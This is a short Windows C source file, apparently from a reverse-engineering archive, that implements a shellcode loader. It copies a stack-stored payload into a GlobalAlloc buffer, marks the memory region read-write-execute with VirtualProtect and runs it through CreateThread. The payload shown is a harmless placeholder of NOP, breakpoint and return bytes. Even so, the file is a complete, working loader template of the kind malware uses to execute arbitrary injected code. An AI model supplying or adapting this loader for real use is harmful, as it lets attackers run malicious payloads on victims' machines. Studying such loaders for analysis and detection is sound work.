/*
    Shellcode Loader
    Archive of Reversing.ID

    storing payload in stack

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: GlobalAlloc(GPTR)
    - writing:    RtlMoveMemory
    - permission: VirtualProtect
    - execution:  CreateThread
*/

#include <windows.h>
#include <stdint.h>

#pragma comment(lib,"onecore")


int main ()
{
    void *  runtime;
    BOOL    retval;
    HANDLE  h_thread;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    SIZE_T      isize;
    WIN32_MEMORY_REGION_INFORMATION info;

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = GlobalAlloc (GPTR, payload_len);

    // find the region where the address belong to
    QueryVirtualMemoryInformation(GetCurrentProcess(), runtime, MemoryRegionInfo, &info, sizeof(info), &isize);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // make buffer executable (RWX) because the region is not only contain shellcode
    retval  = VirtualProtect (info.AllocationBase, info.CommitSize, PAGE_EXECUTE_READWRITE, &old_protect);

    if (retval != 0)
    {
        h_thread = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
        WaitForSingleObject (h_thread, -1);
    }

    // revert region to original protection and free the buffer
    VirtualProtect (info.AllocationBase, info.CommitSize, old_protect, &old_protect);
    GlobalFree (runtime);

    return 0;
}